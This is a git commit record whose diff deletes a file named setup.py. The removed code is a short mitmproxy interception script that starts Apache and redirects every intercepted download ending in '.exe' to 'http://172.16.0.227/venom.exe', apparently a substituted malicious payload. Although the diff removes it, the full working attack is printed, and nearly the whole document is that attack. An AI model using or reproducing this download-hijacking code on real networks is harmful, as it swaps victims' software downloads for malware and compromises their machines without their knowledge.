cb2975e03bbec69419fd119c74649463fe530562
İbrahim Can <118071108+LegendMan46@users.noreply.github.com>
2023-05-28 22:36:07 +0300

    Delete setup.py

--- setup.py
+++
@@ -1,9 +0,0 @@
-import os
-import mitmproxy
-
-os.system("service apache2 start")
-ip=input("Please Enter Your Ip Address :==: ")
-
-def request(flow):
-	if flow.request.pretty_url.endswith(".exe"):
-		flow.response = mitmproxy.http.Response.make(301, "", {"Location" : "http://172.16.0.227/venom.exe"})
